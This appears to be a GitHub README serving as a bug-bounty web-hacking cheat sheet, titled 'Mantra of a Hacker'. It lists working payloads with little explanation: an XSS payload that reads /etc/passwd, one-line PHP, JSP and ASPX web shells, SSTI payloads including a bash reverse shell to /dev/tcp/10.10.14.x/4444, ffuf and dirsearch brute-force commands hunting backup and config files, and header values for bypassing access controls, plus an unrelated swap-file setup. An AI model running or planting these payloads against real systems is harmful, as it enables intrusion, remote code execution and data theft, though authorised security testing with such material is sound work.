Ini Mantra Se Orang Hacker

This is the Mantra of a Hacker


Find Sensitif / Gold / Hoki / Endpoint in JS <br>
![JS](https://skillicons.dev/icons?i=js)
<br>
```$ cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u```<br>
```$ curl -s URL | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u```

<br>

XSS to LFI <br>
```<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>```
<br>
<br>


Code Shell  <br>
PHP
```<?php system($_GET['cmd']); ?>```<br>
JSP
```<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>```<br>
ASPX
```<% @Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>```<br>


SSTI <br>
```${7*7} {{7*7}} {7*7} {{7 * '7'}}```
```{{ request.application.globals.builtins.import('os').popen('id').read() }}```<br>
```{{ self.__init__.__globals__.__builtins__ }}```<br>
```{{ request.application.globals.builtins.import('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"').read() }}```


FFUF <br>
Install
https://github.com/ffuf/ffuf <br>
Wordlist https://github.com/danielmiessler/SecLists <br>
```$ ffuf -u URL/PATH -w alive.txt:URL -w SecLists/Discovery/Web-Content/big.txt:PATH -H "User-Agent: Mozilla/5.0 (Linux; Android 15; 25053PC47G Build/AQ3A.250107.001)..."```


Dirsearch <br>
```cat priv.txt | dirsearch --stdin --exclude-status=401,404,403,429,500,503 -w /root/ffuf/wordlist-2025.txt --random-agent -f --threads 50 -t 10 --exclude-sizes 0B -o dir-results-privat.txt```<br>
```cat 403_sub.txt | dirsearch --stdin --exclude-status=401,404,403,429,500,503 -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bkp,cache,cgi,conf,csv,html,unc,jar,js,json,jsp,jsp~,lock,log,rar,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js,.json --random-agent -f --threads 50 -t 10 --exclude-sizes 0B -o dir.txt```


Routes / Endpoint <br>
```{domain}/application/config/routes.php```


Swap RAM <br>
```sudo fallocate -l 10G /swapfile ```<br>
```sudo chmod 600 /swapfile ```<br>
```sudo mkswap /swapfile ```<br>
```sudo swapon /swapfile ```<br>
```echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab ```<br>


Content-Type <br>
```𝗺𝘂𝗹𝘁𝗶𝗽𝗮𝗿𝘁/𝗳𝗼𝗿𝗺-𝗱𝗮𝘁𝗮```<br>
```a𝗽𝗽𝗹𝗶𝗰𝗮𝘁𝗶𝗼𝗻/𝘅-𝘄𝘄𝘄-𝗳𝗼𝗿𝗺-𝘂𝗿𝗹𝗲𝗻𝗰𝗼𝗱𝗲𝗱```<br>
```a𝗽𝗽𝗹𝗶𝗰𝗮𝘁𝗶𝗼𝗻/json```


Header Injection <br>
```X-Original-URL: /admin  ```<br>
```X-Rewrite-URL: /admin  ```<br>
```X-Custom-IP-Authorization: 127.0.0.1  ```<br>
```X-Forwarded-For: 127.0.0.1  ```<br>
```X-Remote-IP: 127.0.0.1  ```<br>
```X-Originating-IP: 127.0.0.1  ```<br>
```X-Remote-Addr: 127.0.0.1  ```<br>
```X-Client-IP: 127.0.0.1  ```<br>
```True-Client-IP: 127.0.0.1  ```<br>
```Forwarded: for=127.0.0.1```<br>
```X-Api-Key: {KEY}```<br>
```Host: host.com```<br>
```Api-Key: {KEY}```<br>






## 🙏 Thanks

We appreciate every contribution 💖

![fffuf](https://img.shields.io/badge/|fffuf|intigriti|chess|sojalsec|maurosoria|sohai|irwanjugabro|supermancyber|amr|root.bakar|nur|danielmiessler|defcon|-0d1117?style=flat-square&logo=hackthebox&logoColor=00ffcc)
